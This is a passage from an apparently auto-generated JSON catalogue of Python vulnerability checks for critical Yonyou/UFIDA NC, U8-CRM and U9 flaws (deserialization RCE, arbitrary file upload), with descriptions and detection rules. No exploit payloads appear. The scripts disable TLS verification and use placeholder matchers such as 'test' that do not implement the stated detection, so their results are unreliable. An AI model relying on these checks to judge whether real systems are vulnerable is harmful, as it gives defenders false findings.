        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-nc-ncmessageservlet-rce\nName: UFIDA NC NCMessageServlet - Deserialization RCE Detection\nSeverity: critical\nDescription: UFIDA NC is in the process of processing client request data. Insufficient checking and filtering when deserializing user-supplied data can lead to malicious deserialization operations and execution of commands on the operating system. After analysis, security researchers found that the system has many exploit points for deserialization. Currently, the official vulnerability fix plan is to perform deserialization whitelist control on known exploit points and repair some exploit chain dependencies. The possibility of similar problems occurring in the system in the future is still high.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_nc_ncmessageservlet_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-nc-ncmessageservlet-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA NC NCMessageServlet - Deserialization RCE Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_1 == 200 && contains(header_1,\"X-T0ken\") && contains(header_1,\"MTc5Njc2NTUwNg==\"); status_code_2 == 200 && contains(header_2,\"X-T0ken\") && contains(header_2,\"MTc5Njc2NTUwNQ==\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA NC NCMessageServlet - Deserialization RCE Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_nc_ncmessageservlet_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "yonyou",
          "rce",
          "deserialization",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_yonyou_u8_crm_fileupload",
        "name": "UFIDA U8-CRM getemaildata - Arbitary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is an arbitrary file upload vulnerability in the getemaildata.php file of UFIDA U8 CRM customer relationship management system. An attacker can obtain server permissions through the vulnerability and attack the server.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_1==200 && status_code_2==200; contains(body_2, '{{randstr}}')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-u8-crm-fileupload\nName: UFIDA U8-CRM getemaildata - Arbitary File Upload\nSeverity: critical\nDescription: There is an arbitrary file upload vulnerability in the getemaildata.php file of UFIDA U8 CRM customer relationship management system. An attacker can obtain server permissions through the vulnerability and attack the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_u8_crm_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-u8-crm-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA U8-CRM getemaildata - Arbitary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1==200 && status_code_2==200; contains(body_2, '{{randstr}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA U8-CRM getemaildata - Arbitary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_u8_crm_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-u8-crm-fileupload\nName: UFIDA U8-CRM getemaildata - Arbitary File Upload\nSeverity: critical\nDescription: There is an arbitrary file upload vulnerability in the getemaildata.php file of UFIDA U8 CRM customer relationship management system. An attacker can obtain server permissions through the vulnerability and attack the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_u8_crm_fileupload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-u8-crm-fileupload\"\n    SEVERITY = \"critical\"\n    NAME = \"UFIDA U8-CRM getemaildata - Arbitary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: status_code_1==200 && status_code_2==200; contains(body_2, '{{randstr}}')\"\n\n        # Simple word matcher simulation\n        matchers = ['{{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"UFIDA U8-CRM getemaildata - Arbitary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_u8_crm_fileupload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "yonyou",
          "file-upload",
          "u8-crm",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_yonyou_u9_patchfile_upload",
        "name": "Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "An arbitrary file upload vulnerability in U9 PatchFile.asmx allows attackers to upload files to the server.This can lead to various security issues including remote code execution.",
        "severity": "critical",
        "detection": "[OR] mot(s) '<SaveFileResult>true</SaveFileResult>' / [OR] DSL: status_code == 200; contains_all(body, \"2468642\",\"File deleted successfully\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(5)}}.ashx"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-u9-patchfile-upload\nName: Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload\nSeverity: critical\nDescription: An arbitrary file upload vulnerability in U9 PatchFile.asmx allows attackers to upload files to the server.This can lead to various security issues including remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_u9_patchfile_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-u9-patchfile-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] mot(s) \\'<SaveFileResult>true</SaveFileResult>\\' / [OR] DSL: status_code == 200; contains_all(body, \"2468642\",\"File deleted successfully\")'\n\n        # Simple word matcher simulation\n        matchers = ['<SaveFileResult>true</SaveFileResult>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_u9_patchfile_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: yonyou-u9-patchfile-upload\nName: Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload\nSeverity: critical\nDescription: An arbitrary file upload vulnerability in U9 PatchFile.asmx allows attackers to upload files to the server.This can lead to various security issues including remote code execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_yonyou_u9_patchfile_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"yonyou-u9-patchfile-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] mot(s) \\'<SaveFileResult>true</SaveFileResult>\\' / [OR] DSL: status_code == 200; contains_all(body, \"2468642\",\"File deleted successfully\")'\n\n        # Simple word matcher simulation\n        matchers = ['<SaveFileResult>true</SaveFileResult>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Yonyou U9 PatchFile.asmx - Unauthenticated Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_yonyou_u9_patchfile_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "unauth",
          "file-upload",
          "yonyou",
